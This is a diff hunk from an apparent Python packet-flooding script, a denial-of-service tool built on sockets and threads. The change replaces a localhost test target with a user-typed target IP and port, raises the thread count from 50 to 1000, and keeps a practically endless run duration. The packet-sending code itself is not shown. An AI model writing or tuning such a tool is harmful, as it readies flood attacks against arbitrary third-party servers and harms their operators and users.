@@ -2,9 +2,9 @@ import socket
 import threading
 import time
 
-TARGET_IP = '127.0.0.1'
-TARGET_PORT = 8080
-NUM_THREADS = 50
+TARGET_IP = input("TARGET IP: ")
+TARGET_PORT = int(input("OPEN PORT: "))
+NUM_THREADS = 1000
 DURATION = 99999999999999999999999999999999999999999999999999
 
 def send_packets():
